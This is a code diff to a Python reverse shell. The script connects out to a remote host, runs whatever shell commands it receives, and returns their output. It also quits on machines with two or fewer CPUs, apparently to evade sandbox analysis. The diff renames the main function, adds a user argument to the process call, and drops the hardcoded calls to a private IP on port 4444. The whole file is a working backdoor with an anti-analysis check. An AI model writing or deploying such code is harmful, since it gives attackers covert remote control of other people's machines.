@@ -2,7 +2,7 @@ import os
 import socket
 import subprocess
 
-def main(HOST: str, PORT: int):
+def shell(HOST: str, PORT: int):
     if os.cpu_count() <= 2:
         quit()
 
@@ -20,16 +20,12 @@ def main(HOST: str, PORT: int):
             if data[:2] == "cd":
                 os.chdir(data[3:])
             if len(data) > 0:
-                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
+                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, user="20201260") 
                 stdout_value = proc.stdout.read() + proc.stderr.read()
                 output_str = str(stdout_value, "UTF-8")
                 s.send(str.encode("\n" + output_str))
         except Exception as e:
             continue
         
-
-    main("172.20.10.2", 4444)
-
-if __name__ == "__main__":
-    main("172.20.10.2", 4444)
-
+    s.close()
+    
